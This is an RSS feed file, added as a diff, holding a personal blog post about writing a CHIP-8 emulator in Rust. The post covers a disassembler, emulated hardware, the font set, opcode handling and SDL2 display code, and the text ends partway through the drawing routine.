@@ -1,0 +1,1961 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on spook&#39;s blog</title>
+        <link>http://localhost:1313/posts/</link>
+        <description>Recent content in Posts on spook&#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Fri, 26 Apr 2024 00:00:00 +0000</lastBuildDate>
+        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Writing a Chip-8 Emulator</title>
+            <link>http://localhost:1313/posts/chip8/</link>
+            <pubDate>Fri, 26 Apr 2024 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/chip8/</guid>
+            <description>Emulators were a staple of my childhood. I played a variety of classic games on emulators to pass the time. I have always wondered what went into creating an emulator. Research led me to discover that CHIP-8 was an easy platform to develop an emulator for. Further research led me to discover a program that ran CHIP-8 binaries would technically be an interpreter and not an emulator since CHIP-8 programs were run on a virtual machine and not hardware.</description>
+            <content type="html"><![CDATA[<p>Emulators were a staple of my childhood. I played a variety of classic games on emulators to pass the time. I have always wondered what went into creating an emulator. <a href="http://emulator101.com/">Research</a> led me to discover that CHIP-8 was an easy platform to develop an emulator for. Further research led me to discover a program that ran CHIP-8 binaries would technically be an <a href="https://tobiasvl.github.io/blog/write-a-chip-8-emulator/">interpreter and not an emulator</a> since CHIP-8 programs were run on a virtual machine and not hardware. This post is a summary of my experience writing a CHIP-8 emulator in Rust. </p>
+<h1 id="disassembler">Disassembler</h1>
+<p>CHIP-8 has <a href="https://en.wikipedia.org/wiki/CHIP-8#Opcode_table">35 opcodes</a>. All of the opcodes are two bytes long and stored in big-endian format. The first step to writing an emulator would be familiarizing myself with these opcodes. I could do that by writing a disassembler. I chose to write the disassembler in Rust because I wanted to learn the language. A disassembler takes the binary file and converts it to assembly. The CHIP-8 does not have an official assembly language, as a result, I used the pseudo-C code in the Wikipedia opcode table. The disassembler was fairly straightforward. I first opened the binary file. </p>
+<pre tabindex="0"><code class="language- rust " data-lang=" rust ">
+let file = fs::read(&amp;args[1]);
+
+let mut counter =0;
+
+let file = file.expect(&#34;File could not be opened&#34;);
+</code></pre><p>I then iterated over every two bytes in the file. A match statement then identified the relevant opcode and printed it. The first byte of the CHIP-8 opcode states which kind of instruction is being performed. The other bytes could represent memory addresses, registers, or 8-4 bit constants. </p>
+<p>I wrote three helper functions to extract specific bytes from the full opcode. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+// return any specific byte from an opcode.
+
+fn get_byte(abyte:i32, opcode:u16 ) -&gt;u16 {
+
+  match abyte{
+
+    0=&gt; return opcode &gt;&gt; 12,
+
+    1=&gt; return (opcode &lt;&lt; 4) &gt;&gt;12,
+
+    2=&gt; return (opcode &lt;&lt;8 ) &gt;&gt;12,
+
+    3=&gt;return opcode&amp; 0xF,
+
+    _=&gt; return 1,
+
+  }
+
+}
+
+// returns the 12-bit address specified in opcodes like jump
+
+fn get_addr(opcode:u16) -&gt; u16{
+
+  return opcode &amp; 0xFFF;
+
+}
+
+// returns 8-bit constants specified in instructions like if 
+
+fn get_last_two(opcode:u16) -&gt; u8{
+
+  return (opcode &amp; 0xFF) as u8;
+
+}
+</code></pre><p>The dissembler prints the corresponding pseudo-C code for each opcode in the binary.</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+while counter &lt; file.len() {
+
+    let opcode = ((file[counter] as u16) &lt;&lt; 8) | file[counter+1] as u16;
+
+    let intial_byte = file[counter] &gt;&gt; 4;
+
+    match nibble {
+
+      0 =&gt;{ if opcode ==0x00E0 { println!(&#34;disp_clear()&#34;)      
+
+      };
+
+      if opcode == 0xEE {println!(&#34;ret&#34;)};}
+
+      1 =&gt; println!(&#34;goto {:x}&#34;,get_addr(opcode)),
+
+      2=&gt; println!(&#34;*({:x})()&#34;, get_addr(opcode) ),
+
+      3=&gt; println!(&#34;if register:{} == {:x}&#34;,get_byte(1, opcode), get_last_two(opcode)),
+
+--SNIP--
+
+      _=&gt; print!(&#34;&#34;)
+
+    }
+
+    counter= counter+2;
+</code></pre><p>Running the disassembler through on a random ROM led to an output that looked like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>V5<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">disp_clear</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>V3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">255</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> I <span style="color:#f92672">=</span> <span style="color:#ae81ff">546</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_BCD</span> (v3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">reg_load</span>(v2,<span style="color:#f92672">&amp;</span>I)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>V4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I sprite_addr [v0]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">draw</span>(V4, V5, <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I sprite_addr [v1]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">draw</span>(V4, V5, <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I sprite_addr [v2]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">draw</span>(V4, V5, <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v3<span style="color:#f92672">=</span> <span style="color:#a6e22e">get_key</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> <span style="color:#ae81ff">202</span>
+</span></span></code></pre></div><p>The output looked reasonably correct. Testing other ROMs, I noticed some opcodes within the files were not being recognized. After a bit of research, I realized that data was for drawing sprites. I was ready to implement the CHIP-8 hardware and start executing instructions. </p>
+<h1 id="minimum-viable-emulator">Minimum Viable Emulator </h1>
+<h2 id="chip-8-hardware">CHIP-8 &ldquo;Hardware&rdquo;</h2>
+<p>I created a CHIP-8 struct to simulate all the hardware needed to run CHIP-8 instructions. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Chip8</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// all the general purpose registers(V0-VF). The 16th register VF is a flag register set to one to indicate things like collision. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v: [<span style="color:#66d9ef">u8</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Index register used to hold address values used for certain opcodes. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  I: <span style="color:#66d9ef">u16</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// A stack pointer used to indicate where new entries can be added to the stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">SP</span>: <span style="color:#66d9ef">u16</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//The program counter which indicates the current instruction in memory.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">PC</span>:<span style="color:#66d9ef">u16</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//The delay timer is decremented once a clock tick.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  delay: <span style="color:#66d9ef">u8</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//The sound timer beeps as long as the timer is not zero.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  sound: <span style="color:#66d9ef">u8</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//4 kilobytes of RAM for the CHIP-8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  memory: [<span style="color:#66d9ef">u8</span>;<span style="color:#ae81ff">4096</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//The display is a 64 by 32 grid of pixels that can be on or off.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  display:[<span style="color:#66d9ef">bool</span>;<span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//The stack implemented outside of the emulated memory 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  stack: [<span style="color:#66d9ef">u16</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//A variable to keep track of which keys are being pressed. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  keys: [<span style="color:#66d9ef">bool</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Next, I implemented a new function for the CHIP-8 struct. The program counter is set to 0x200 where the ROM will be loaded into memory. All other variables are initialized to zero. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">impl</span> Chip8 {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">new</span>() -&gt; <span style="color:#a6e22e">Chip8</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Chip8 {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">SP</span>:<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">PC</span>: <span style="color:#ae81ff">0x200</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      delay:<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      sound:<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      v: [<span style="color:#ae81ff">0</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      I:<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      memory:[<span style="color:#ae81ff">0</span>;<span style="color:#ae81ff">4096</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      display: [<span style="color:#66d9ef">false</span>;<span style="color:#ae81ff">64</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      stack:[<span style="color:#ae81ff">0</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      keys:[<span style="color:#66d9ef">false</span>;<span style="color:#ae81ff">16</span>],
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>The push and pop functions for the stack are then implemented. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">push</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self, value: <span style="color:#66d9ef">u16</span> ) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.stack[self.<span style="color:#66d9ef">SP</span> <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>]<span style="color:#f92672">=</span>value;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.<span style="color:#66d9ef">SP</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">pop</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self) -&gt; <span style="color:#66d9ef">u16</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> address <span style="color:#f92672">=</span>self.stack[(self.<span style="color:#66d9ef">SP</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self.<span style="color:#66d9ef">SP</span><span style="color:#f92672">-=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> address;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Finally, I was ready to load a ROM and the font set into memory. The font set consists of sprite data for printable characters. It is required because the CHIP-8 emulator is responsible for its own font set. The fontset can be stored anywhere in the first 512 bytes of memory which is reserved for the emulator. The code that is below loads the ROM and font set into memory: </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">load_rom</span>(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> self, rom: Vec<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> counter <span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    self.memory[<span style="color:#f92672">..</span><span style="color:#ae81ff">80</span>].copy_from_slice(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">FONTSET</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> counter<span style="color:#f92672">&lt;</span> rom.len(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      self.memory[(self.<span style="color:#66d9ef">PC</span> <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span><span style="color:#f92672">+</span> counter) ]<span style="color:#f92672">=</span> rom[counter];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      counter<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>The font set is below:</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+const FONTSET: [u8; 80] = [
+
+  0xF0, 0x90, 0x90, 0x90, 0xF0, // 0
+
+  0x20, 0x60, 0x20, 0x20, 0x70, // 1
+
+  0xF0, 0x10, 0xF0, 0x80, 0xF0, // 2
+
+  0xF0, 0x10, 0xF0, 0x10, 0xF0, // 3
+
+  0x90, 0x90, 0xF0, 0x10, 0x10, // 4
+
+  0xF0, 0x80, 0xF0, 0x10, 0xF0, // 5
+
+  0xF0, 0x80, 0xF0, 0x90, 0xF0, // 6
+
+  0xF0, 0x10, 0x20, 0x40, 0x40, // 7
+
+  0xF0, 0x90, 0xF0, 0x90, 0xF0, // 8
+
+  0xF0, 0x90, 0xF0, 0x10, 0xF0, // 9
+
+  0xF0, 0x90, 0xF0, 0x90, 0x90, // A
+
+  0xE0, 0x90, 0xE0, 0x90, 0xE0, // B
+
+  0xF0, 0x80, 0x80, 0x80, 0xF0, // C
+
+  0xE0, 0x90, 0x90, 0x90, 0xE0, // D
+
+  0xF0, 0x80, 0xF0, 0x80, 0xF0, // E
+
+  0xF0, 0x80, 0xF0, 0x80, 0x80 // F
+
+];
+</code></pre><p>After that, I was ready to write the function that fetches and executes instructions from memory. Four bytes are fetched from the address in the PC. The opcode is created with some bit-shifting. A match statement then mutates the state of the CHIP-8 struct to perform the correct instruction. Lastly, the PC is incremented twice to point to the next opcode.</p>
+<pre tabindex="0"><code class="language- rust" data-lang=" rust">
+fn fetch_execute(&amp;mut self){
+
+let opcode=((self.memory[self.PC as usize ] as u16) &lt;&lt; 8) | self.memory[(self.PC+1) as usize] as u16;
+
+--SNIP match statement from disassembler--
+
+// finally we increment the program counter by two 
+
+self.PC+=2;
+</code></pre><p>The new goal was to implement a few of the easier opcodes. Just enough opcodes to run the IBM logo program. Which only required the following opcodes:</p>
+<ul>
+<li>
+<p><code>00E0</code> (clear screen) </p>
+</li>
+<li>
+<p><code>1NNN</code> (jump) </p>
+</li>
+<li>
+<p><code>6XNN</code> (set register <code>VX</code>) </p>
+</li>
+<li>
+<p><code>7XNN</code> (add value to register <code>VX</code>) </p>
+</li>
+<li>
+<p><code>ANNN</code> (set index register) </p>
+</li>
+<li>
+<p><code>DXYN</code> (display/draw)</p>
+</li>
+</ul>
+<p>Later I discovered there was a CHIP-8 splash screen program that did not use 7XNN the instruction which would be an easier target for the first program to run. I left the display instruction to be implemented last due to its complexity. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+// inside match statement 
+
+ 0 =&gt;{ 
+
+ if opcode ==0x00E0 { 
+
+ //Clearing the screen turns off all pixels in the display
+
+ self.display= [false;64*32];        
+
+          };
+
+// Jump sets the PC to a 12-bit address. The PC is preemptively decremented to stop the opcode from being skipped. At the end of the match statement, the PC is incremented, but should not be after a jump.  
+
+1 =&gt; {self.PC=get_addr(opcode); self.PC-=2;},
+
+--SNIP--
+
+// The register VX is set to NN
+
+ 6=&gt; {self.v[get_byte(1, opcode) as usize]=get_last_two(opcode);},
+
+ // A value NN is added to the register VX
+
+7=&gt; self.v[get_byte(1, opcode) as usize]=(get_last_two(opcode) as u16 +self.v[get_byte(1, opcode) as usize]as u16)as u8,
+
+//The index register is set to a 12-bit address
+
+0xA=&gt; {self.I= get_addr(opcode);},
+</code></pre><h1 id="the-dreaded-display-instruction">The dreaded Display Instruction </h1>
+<p>Lastly, the display instruction had to be attempted. Before Implementing the instruction I had to figure out how to display things to the screen in Rust. After some reading, I settled on using the Rust <a href="https://github.com/Rust-SDL2/rust-sdl2">sdl2 library</a>. I found a [tutorial] (<a href="https://blog.logrocket.com/using-sdl2-bindings-rust/">https://blog.logrocket.com/using-sdl2-bindings-rust/</a>) on using the library to create a snake game to learn how to draw pixels to the screen. First, I initialize a window that is 64 units by 32 units with a dot size in pixels of 20. Future me should make the pixel size customizable. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">GRID_X_SIZE</span>: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">GRID_Y_SIZE</span>: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">DOT_SIZE_IN_PXS</span>: <span style="color:#66d9ef">u32</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> sdl_context <span style="color:#f92672">=</span> sdl2::init()<span style="color:#f92672">?</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> video_subsystem <span style="color:#f92672">=</span> sdl_[context.video](http:<span style="color:#75715e">//context.video)().expect(&#34;video&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> window <span style="color:#f92672">=</span> video_subsystem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .window(
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;chip 8&#34;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">GRID_X_SIZE</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">DOT_SIZE_IN_PXS</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">GRID_Y_SIZE</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">DOT_SIZE_IN_PXS</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .position_centered()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .opengl()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .build()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .map_err(<span style="color:#f92672">|</span>e<span style="color:#f92672">|</span> [e.to](http:<span style="color:#75715e">//e.to)_string()).expect(&#34;map&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// renderer is a helper struct???
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> gfx <span style="color:#f92672">=</span> Renderer::new(window).expect(<span style="color:#e6db74">&#34;render&#34;</span>);
+</span></span></code></pre></div><p>Next, the main loop of drawing the screen could be written. I first listened for any keyboard events. The program sleeps to slow down the emulation to a reasonable rate. Original CHIP-8 displays ran at 60 Hz. Next, an instruction is fetched and executed. Finally, the display is drawn using the draw screen function. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+ &#39;running: loop {
+
+     for event in event_pump.poll_iter() {
+
+      match event {
+
+--SNIP-- 
+
+    }
+
+    // sleep 120 times per second
+
+    ::std::thread::sleep(Duration::new(0, 1_000_000_000u32 / 120));
+
+    Chip8.fetch_execute();
+
+    gfx.draw_screen(Chip8.display);
+
+  }
+</code></pre><p>The draw screen function iterates over the display array. A square is drawn where a turned-on pixel should be.</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+  fn draw_screen(&amp;mut self, display: [bool;64*32] ){
+
+    self.canvas.set_draw_color(Color::BLACK);
+
+    self.clear();
+
+    self.canvas.set_draw_color(Color::GREEN);
+
+    let mut counter=0;
+
+    while counter &lt; display.len(){
+
+      if display[counter]{
+
+      //converts from 1d array to 2d coordinates.
+
+        let x = counter %64;
+
+        let y = counter /64;
+
+        self.canvas.fill_rect(Rect::new(
+
+          x as i32* [self.DOT](http://self.DOT)_SIZE_IN_PXS as i32 ,
+
+          y as i32* [self.DOT](http://self.DOT)_SIZE_IN_PXS as i32,
+
+          [self.DOT](http://self.DOT)_SIZE_IN_PXS,
+
+          [self.DOT](http://self.DOT)_SIZE_IN_PXS,
+
+        )).expect(&#34;&#34;);
+
+      };
+
+      counter+=1;
+
+      }
+
+      //Displays the canvas we have drawn to the screen.
+
+       self.canvas.present();
+
+      self.canvas.set_draw_color(Color::BLACK);
+
+  }
+</code></pre><p>I tested the draw_screen function by manually turning on some pixels. I was ready to implement the CHIP-8 display function. It proved to be harder than initially thought it would be. I found this <a href="https://www.reddit.com/r/EmuDev/comments/sa5cyf/eli5_how_chip8_display_work/">Reddit thread</a> to be most helpful in understanding how the instruction was supposed to work. The display instruction takes two registers X and Y and a number N which is how tall the sprite will be. Care must be taken to use the value in the register and not X or Y directly.</p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+// This register is set 1 one if sprites collide
+
+self.v[0xf]=0;
+
+let x_register_number= get_byte(1, opcode);
+
+let y_register_number= get_byte(2, opcode);
+
+let x_position = self.v[x_register_number as usize] %64;
+
+let y_position = self.v[y_register_number as usize] %32;
+
+let rows = get_byte(3, opcode);
+</code></pre><p>For every row N, I must get the Nth byte of sprite data counting from the address in the Index register I. </p>
+<pre tabindex="0"><code class="language-rust " data-lang="rust ">
+for sprite_row in 0..rows {
+
+let sprite_row_data= self.memory[(self.I + sprite_row)as usize];
+</code></pre><p>For every bit in the byte, I check if the bit would be drawn within the bounds of the display. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> bit <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">..</span><span style="color:#ae81ff">8</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (x_position<span style="color:#f92672">+</span>bit <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&amp;</span> ((y_position<span style="color:#f92672">+</span> sprite_row <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u8</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>){
+</span></span></code></pre></div><p>Next, the 2d x and y positions are converted into a 1d index for the display array.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> index:<span style="color:#66d9ef">u16</span> <span style="color:#f92672">=</span> (x_position <span style="color:#f92672">+</span>bit) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span> <span style="color:#f92672">+</span>((y_position <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span><span style="color:#f92672">+</span>sprite_row <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>)<span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> screen_pixel <span style="color:#f92672">=</span> self.display[index <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">usize</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> sprite_pixel <span style="color:#f92672">=</span> (sprite_row_data <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> bit)) <span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>;
